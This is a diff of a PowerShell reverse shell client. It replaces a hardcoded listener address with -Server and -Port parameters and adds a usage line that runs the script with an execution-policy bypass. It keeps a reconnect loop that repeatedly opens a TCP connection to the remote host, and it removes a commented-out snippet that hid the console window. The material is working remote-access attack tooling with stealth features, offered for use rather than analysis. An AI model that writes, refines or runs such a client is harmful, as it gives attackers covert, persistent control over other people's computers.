@@ -1,9 +1,29 @@
 # Windows Reverse Shell Client
 # Requires PowerShell 5.1 or higher
 
-# Script configuration
-$Global:ServerIP = "<LSTNR_IP>"
-$Global:ServerPort = 443
+param(
+    [Parameter(Mandatory=$true, HelpMessage="Server IP address to connect to")]
+    [string]$Server,
+    
+    [Parameter(Mandatory=$true, HelpMessage="Server port to connect to")]
+    [int]$Port,
+    
+    [Parameter(Mandatory=$false)]
+    [switch]$Help
+)
+
+if ($Help) {
+    Write-Host "LSTNR Client"
+    Write-Host ""
+    Write-Host "Usage: powershell -ep bypass .\client.ps1 -Server <IP> -Port <PORT>"
+    Write-Host ""
+    Write-Host "Parameters:"
+    Write-Host "  -Server    Server IP address to connect to"
+    Write-Host "  -Port      Server port to connect to"
+    Write-Host "  -Help      Show this help message"
+    exit
+}
+
 $Global:ReconnectDelay = 5
 
 function Test-Administrator {
@@ -72,9 +92,9 @@ function Start-Client {
     while ($true) {
         try {
             $client = New-Object System.Net.Sockets.TcpClient
-            $client.Connect($ServerIP, $ServerPort)
+            $client.Connect($Server, $Port)
             
-            Write-Host "[+] Connected to server"
+            Write-Host "[+] Connected to $Server`:$Port"
             
             $stream = $client.GetStream()
             $writer = New-Object System.IO.StreamWriter($stream)
@@ -127,7 +147,6 @@ function Start-Client {
                         $writer.Flush()
                     }
                 } catch [System.IO.IOException] {
-                    # Connection interrupted, try to reconnect
                     break
                 }
             }
@@ -151,15 +170,5 @@ function Start-Client {
     }
 }
 
-# Optional: Hide the PowerShell window
-# Add-Type -Name Window -Namespace Console -MemberDefinition '
-# [DllImport("Kernel32.dll")] 
-# public static extern IntPtr GetConsoleWindow();
-# [DllImport("user32.dll")]
-# public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-# '
-# $consolePtr = [Console.Window]::GetConsoleWindow()
-# [Console.Window]::ShowWindow($consolePtr, 0)
-
 # Start the client
-Start-Client
+Start-Client 
